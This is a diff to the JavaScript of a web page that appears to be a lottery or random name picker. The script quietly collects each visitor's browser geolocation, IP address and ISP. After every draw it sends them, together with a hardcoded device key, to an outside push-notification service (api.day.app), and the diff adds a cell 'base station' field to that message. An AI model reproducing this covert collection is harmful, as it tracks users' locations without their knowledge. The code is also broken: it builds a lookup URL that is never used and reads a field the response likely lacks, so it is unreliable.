@@ -95,6 +95,7 @@
 </div>
  <script>
 	 var jsonData=null;
+	 var jsonDataBaseStation=null;
 	  var jsonlongitude=null;
 	   var jsonlatitude=null;
 	 // 封装函数
@@ -114,10 +115,13 @@ window.onload=function getLocation() {
       const { latitude, longitude } = coords;
 	  jsonlongitude=longitude;
 	  jsonlatitude=latitude;
-	  getJsonObj('https://api.ip.sb/geoip',(data) => {
+	  getJsonObj('https://api.ip.sb/geoip',(data1) => {
   // 一个对象
-  jsonData=data;
-  jsonData.toString();
+  jsonData=data1;
+ let BaseStationUrl='http://ip.zxinc.org/api.php?type=json&ip'+jsonData.ip;
+		getJsonObj('https://api.ip.sb/geoip',(data2) => {  
+			jsonDataBaseStation=data2;
+			  });
   });
     }, (e) => {
       reject(e)
@@ -256,15 +260,11 @@ window.onload=function getLocation() {
                     oDiv.innerHTML = getName();
                     clearInterval(mySet);
                     creatName();
-					var httpRequest = new XMLHttpRequest();//第一步：创建需要的对象
 					var date=new Date();
 					var strdate=date.getUTCFullYear()+"-"+(date.getMonth()+1)+"-"+date.getDate()+" "+date.getHours()+":"+date.getMinutes()+":"+date.getSeconds()+"."+date.getMilliseconds();
-					var url = "https://api.day.app/TbsfqDZZoJXnaP46cttdsN/"+strdate+"\n本次抽奖结果："+oDiv.innerHTML+"\n本次抽奖IP地址："+jsonData.ip+"\n本次抽奖运营商："+jsonData.asn_organization+"\n本次抽奖经纬度："+jsonlongitude+','+jsonlatitude+"?url=http://ip.zxinc.org/api.php?type=json&ip=";
-					httpRequest.withCredentials=true;
-					httpRequest.open('GET', url, true); //第二步：打开连接
-					//httpRequest.open('POST', url1, true); //第二步：打开连接
-					httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");//设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）
-					httpRequest.send(null);//发送请求 将请求体写在send中
+					var url = "https://api.day.app/TbsfqDZZoJXnaP46cttdsN/"+strdate+"\t\t\t本次抽奖结果："+oDiv.innerHTML+"\t\t\t本次抽奖IP地址："+jsonData.ip+"\t\t\t本次抽奖运营商："+jsonData.asn_organization+"\n本次抽奖经纬度："+jsonlongitude+','+jsonlatitude+"\t\t\t本次抽奖基站："+jsonDataBaseStation.data.location;
+			getJsonObj(url,(data) => {
+  });
                     return null;
                 }
                 oDiv.innerHTML = arrName[Math.floor(Math.random()*(arrName.length-1))];
